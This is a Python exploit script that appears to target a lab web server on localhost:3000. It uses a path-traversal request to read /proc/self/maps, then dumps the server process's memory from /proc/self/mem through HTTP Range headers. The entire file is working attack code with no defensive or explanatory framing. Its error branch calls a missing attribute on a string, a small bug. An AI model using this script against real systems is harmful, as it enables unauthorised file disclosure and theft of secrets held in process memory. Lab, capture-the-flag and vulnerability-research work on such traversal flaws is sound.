import requests
import socket

def send_http_request(host, port, request): # we use Socket module instead of Request module because the HTTP response has a Content-Length: 0 so Request ignores the content of the response
    
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client_socket.connect((host, port))

        client_socket.sendall(request.encode())
        response = b''
        while True:
            part = client_socket.recv(4096)
            if not part:
                break
            response += part
        
        return response.decode()
    
    finally:
        client_socket.close()


def read_mem_range(start, end):
    url = "http://localhost:3000/../../../../../../../../../../../../../proc/self/mem"
    headers = {
        "Host": "localhost:3000",
        "Range": f"bytes={start}-{end}",
        "Connection": "close"
    }
    s = requests.Session()
    r = requests.Request(method='GET',url=url, headers=headers)
    prep = r.prepare()
    prep.url = url 
   
    response=s.send(prep)
    return response.content

def main():
    host = "localhost"
    port = 3000
    http_request = "GET /../../../../../../../../../../../../../proc/self/maps HTTP/1.1\r\nHost: localhost:3000\r\nConnection: close\r\n\r\n"
    response = send_http_request(host, port, http_request)
    content=response.split("\r\n\r\n")[1] # Skip HTTP headers
    if content:
        lines = content.split('\n')  
        ranges = [line.split()[0] for line in lines if line.strip()]  # Extract memory ranges
        dec_ranges = [f"{int(start, 16)}-{int(end, 16)}" for start, end in (range_.split('-') for range_ in ranges)]

        # Read memory for each range
        for range_ in dec_ranges:
            start, end = range_.split('-')
            mem_content = read_mem_range(start, end)
            if mem_content:
                print(mem_content.decode(errors='ignore'))  # Decode memory content to string
            else:
                #print(f"Failed to read memory range: {range_}")
                print("\n")
    else:
        print(f"Failed to retrieve /proc/self/maps: {response.status_code}")

if __name__ == "__main__":
    main()
